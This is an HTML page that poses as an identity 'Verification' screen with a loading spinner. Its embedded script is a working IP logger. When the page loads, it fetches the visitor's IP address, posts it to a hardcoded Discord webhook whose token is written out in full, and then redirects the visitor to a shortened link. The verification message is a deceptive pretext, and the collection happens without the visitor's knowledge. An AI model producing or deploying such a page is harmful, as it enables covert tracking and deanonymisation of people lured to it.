<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verification</title>
    <style>
        /* Dark Theme & Centered Content */
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }

        .loading-message {
            font-size: 18px;
        }

        .spinner {
            margin-top: 20px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        /* Loading Animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <h1>Verifying...</h1>
    <p class="loading-message" id="loadingMessage">Please wait while we verify your identity.</p>
    <div class="spinner"></div>

    <script>
        // Configuration
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        const REDIRECT_URL = "https://is.gd/gwuu9c";

        // Function to fetch user's IP address
        async function getUserIP() {
            try {
                const response = await fetch("https://api64.ipify.org?format=json");
                if (!response.ok) throw new Error("Failed to fetch IP");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP:", error);
                return null;
            }
        }

        // Function to send IP to Discord webhook
        async function sendToWebhook(ip) {
            try {
                const payload = { content: `New Visitor IP: ${ip}` };
                const response = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) throw new Error("Failed to send to webhook");
                console.log("IP successfully sent to Discord webhook");
            } catch (error) {
                console.error("Error sending IP to webhook:", error);
            }
        }

        // Main execution on page load
        window.onload = async function () {
            try {
                document.getElementById('loadingMessage').innerText = "Fetching your IP address...";
                
                const ip = await getUserIP();
                if (ip) {
                    await sendToWebhook(ip);
                }

                // Redirect after 3 seconds
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 3000);

            } catch (error) {
                console.error("Unexpected error:", error);
                document.getElementById('loadingMessage').innerText = "Something went wrong. Please try again.";
            }
        };
    </script>

</body>
</html>
